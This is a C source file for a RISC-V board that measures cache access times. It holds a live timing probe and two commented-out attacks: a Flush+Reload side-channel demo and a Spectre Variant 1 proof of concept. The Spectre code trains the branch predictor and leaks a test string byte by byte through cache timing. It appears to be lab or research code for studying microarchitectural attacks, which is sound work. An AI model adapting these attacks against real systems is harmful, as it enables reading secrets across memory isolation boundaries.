#include "cache.h"
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include <malloc.h>
#include <metal/timer.h>
#include <metal/cpu.h>



// #include <emmintrin.h>
// #include <x86intrin.h>
// #include <stdlib.h>
// #include <stdio.h>
// #include <stdint.h>

// #define ARRAY_SIZE_X 15
// #define ARRAY_SIZE_Y 512

// uint8_t array[ARRAY_SIZE_X*ARRAY_SIZE_Y];
// int temp;
// char secret = 13;
// /* cache hit time threshold assumed*/
// #define CACHE_HIT_THRESHOLD (599)
// #define DELTA 256

// void victim()
// {
//   temp = array[secret*ARRAY_SIZE_Y + DELTA];
// }
// void flushSideChannel()
// {
//   int i;
//   // Write to array to bring it to RAM to prevent Copy-on-write
//   for (i = 0; i < ARRAY_SIZE_X; i++) array[i*ARRAY_SIZE_Y + DELTA] = 1;
//   //flush the values of the array from cache
//   int junk;
//   for (i = 0; i < ARRAY_SIZE_X; i++) {
//       asm volatile ("fence.i" ::: "memory");
//       junk = array[i*ARRAY_SIZE_Y + DELTA];
//       junk = &array[i*ARRAY_SIZE_Y + DELTA];
//       junk = 0;
//       asm volatile ("fence.i" ::: "memory");

//   }


// }

// void reloadSideChannel()
// {
//   int junk=0;
//   uint64_t time1, time2;
//   volatile uint8_t *addr;
//   int i;
//   for(i = 0; i < ARRAY_SIZE_X; i++){
//     // asm volatile ("fence.i" ::: "memory");
//    addr = &array[i*ARRAY_SIZE_Y + DELTA];
// //    time1 = __rdtscp(&junk);
//    metal_timer_get_cyclecount(metal_cpu_get_current_hartid(), (uintptr_t)&time1);
//    junk = *addr;
//    metal_timer_get_cyclecount(metal_cpu_get_current_hartid(), (uintptr_t)&time2);
//    time2 = time2 - time1;
// //    time2 = __rdtscp(&junk) - time1;
//    if (time2 <= CACHE_HIT_THRESHOLD){
// 	printf("array[%d*%d + %d] is in cache. %d\n", i, ARRAY_SIZE_Y, DELTA, time2);
//         printf("The Secret = %d.\n",i);
//    }
//   } 
// }

// int main(int argc, const char **argv)
// {
//   flushSideChannel();
//   victim();
//   reloadSideChannel();
//   return (0);
// }



#define POS  10
#define SIZ  512


uint8_t array [POS*SIZ];
int main(int argc, const char **argv) {
  int junk=0;
  
  // array = malloc(10*1024*sizeof(uint8_t));
//   uint8_t array[10*1024];
   uint32_t time1, time2;
  volatile uint8_t *addr;
  int i,j;
  // Intialize the array
  for(i=0; i<POS; i++) array[i*SIZ]=1;
  // FLUSH the array from the CPU cache
  for(i=0; i<POS; i++) flushCache((uint32_t) array, sizeof(array));
  



//   // Access some of the array items
//   array[3*SIZ] = 10;
//   array[7*SIZ] = 20;
  for(i=0; i<POS; i++) {

    addr = &array[i*SIZ];
    // time1 = __rdtscp(&junk);   
    // time1 = rdcycle();
    metal_timer_get_cyclecount(metal_cpu_get_current_hartid(), (uintptr_t)&time1);
    junk = *addr;

    metal_timer_get_cyclecount(metal_cpu_get_current_hartid(), (uintptr_t)&time2);
    time2 -= time1;

    // time2 = rdcycle() - time1;  
    printf("Access time for array[%d]: %d CPU cycles\n",i, (int)time2);
  }
  return 0; 
}



// #include <stdio.h>
// #include <stdint.h> 
// #include "encoding.h"
// #include "cache.h"

// #define L1_BLOCK_SZ_BYTES 32


// #define TRAIN_TIMES 5 // assumption is that you have a 2 bit counter in the predictor
// #define ROUNDS 5 // run the train + attack sequence X amount of times (for redundancy)
// #define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
// #define SECRET_SZ 10
// #define CACHE_HIT_THRESHOLD 5000

// uint32_t array1_sz = 16;
// uint8_t unused1[64];
// uint8_t array1[160];
// uint8_t unused2[64];
// uint8_t array2[160 * L1_BLOCK_SZ_BYTES];
// char* secretString = "1234567890";

// /**
//  * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
//  * corresponding values) in the inArray array that has the highest values.
//  *
//  * @input inArray array of values to find the top two maxs
//  * @input inArraySize size of the inArray array in entries
//  * @inout outIdxArray array holding the idxs of the top two values
//  *        ([0] idx has the largera value in inArray array)
//  * @inout outValArray array holding the top two values ([0] has the larger value)
//  */
// void topTwoIdx(uint32_t* inArray, uint32_t inArraySize, uint8_t* outIdxArray, uint32_t* outValArray){
//     outValArray[0] = 0;
//     outValArray[1] = 0;

//     for (uint32_t i = 0; i < inArraySize; ++i){
//         if (inArray[i] > outValArray[0]){
//             outValArray[1] = outValArray[0];
//             outValArray[0] = inArray[i];
//             outIdxArray[1] = outIdxArray[0];
//             outIdxArray[0] = i;
//         }
//         else if (inArray[i] > outValArray[1]){
//             outValArray[1] = inArray[i];
//             outIdxArray[1] = i;
//         }
//     }
// }

// void test(){
//     uint8_t dummy = 2;
//     uint8_t arrayz = 256;
//     arrayz = arrayz / dummy;
//     arrayz = arrayz / dummy;
//     arrayz = arrayz / dummy;
//     arrayz = arrayz / dummy;
// }

// /**
//  * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
//  * the bounds of the array through the Spectre Variant 1 attack.
//  *
//  * @input idx input to be used to idx the array
//  */
// void victimFunc(uint32_t idx){
//     uint8_t dummy = 2;

//     // // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
//     // array1_sz =  array1_sz << 4;
//     // array1_sz = array1_sz / (2*4);
//     array1_sz = array1_sz + 4;

//         // asm(
//         //     "lw     a2, 8(%[in])\n"
//         //     "lw	    a3, 8(%[inout])\n"
//         //     "div    a3, a3, a2\n"
//         //     "div	a3, a3, a2\n"
//         //     "div	a3, a3, a2\n"
//         //     "div	a3, a3, a2\n"
//         //     "sw	    a3, 8(%[out])\n"
//         //     : [out] "=r" (array1_sz)
//         //     : [inout] "r" (array1_sz), [in] "r" (dummy)
//         //     : "a2", "a3");

//     array1_sz = array1_sz - 2;
//     array1_sz = array1_sz - 2;

//     // asm("fcvt.s.wu	fa4, %[in]\n"
//     //     "fcvt.s.wu	fa5, %[inout]\n"
//     //     "fdiv.s	fa5, fa5, fa4\n"
//     //     "fdiv.s	fa5, fa5, fa4\n"
//     //     "fdiv.s	fa5, fa5, fa4\n"
//     //     "fdiv.s	fa5, fa5, fa4\n"
//     //     "fcvt.s.wu	%[out], fa5, rtz\n"
//     //     : [out] "=r" (array1_sz)
//     //     : [inout] "r" (array1_sz), [in] "r" (dummy)
//     //     : "fa4", "fa5");

//     if (idx < array1_sz){
//         dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
//     }

//     // bound speculation here just in case it goes over
//     dummy = rdcycle();
// }

// int main(void){
//     uint32_t attackIdx = (uint32_t)(secretString - (char*)array1);
//     uint32_t start, diff, passInIdx, randIdx;
//     uint8_t dummy = 0;
//     static uint32_t results[256];
    
    

//     // try to read out the secret
//     for(uint32_t len = 0; len < SECRET_SZ; ++len){


//         // clear results every round
//         for(uint32_t cIdx = 0; cIdx < 256; ++cIdx){
//             results[cIdx] = 0;
//         }

//         // run the attack on the same idx ATTACK_SAME_ROUNDS times
//         for(uint32_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){

//             // make sure array you read from is not in the cache
//             asm volatile ("fence.i" ::: "memory");

//             for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
//                 // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
//                 // avoid jumps in case those tip off the branch predictor
//                 // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
//                 //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
//                 randIdx = atkRound % array1_sz;
//                 passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
//                 passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
//                 passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 

//                 // set of constant takens to make the BHR be in a all taken state
//                 for(uint32_t k = 0; k < 30; ++k){
//                     asm("");
//                 }

//                 // call function to train or attack
//             asm volatile ("fence.i" ::: "memory");

//                 victimFunc(passInIdx);
//             }
            
//             // read out array 2 and see the hit secret value
//             // this is also assuming there is no prefetching
//             for (uint32_t i = 0; i < 256; ++i){
//             // asm volatile ("fence.i" ::: "memory");

//                 metal_timer_get_cyclecount(metal_cpu_get_current_hartid(), (uintptr_t)&start);
//                 dummy &= array2[i * L1_BLOCK_SZ_BYTES];
//                 metal_timer_get_cyclecount(metal_cpu_get_current_hartid(), (uintptr_t)&diff);
//                 diff -= start;
//                 if ( diff < CACHE_HIT_THRESHOLD ){
//                     results[i] += 1;
//                 }

//             }
            
//         }
        
//         // get highest and second highest result hit values
//         uint8_t output[2];
//         uint32_t hitArray[2];
//         topTwoIdx(results, 256, output, hitArray);

//         printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", 
//         (uint8_t*)(array1 + attackIdx), secretString[len], 
//         hitArray[0], output[0], output[0], 
//         hitArray[1], output[1], output[1]
//         ); 

//         // read in the next secret 
//         ++attackIdx;
//     }

//     return 0;
// }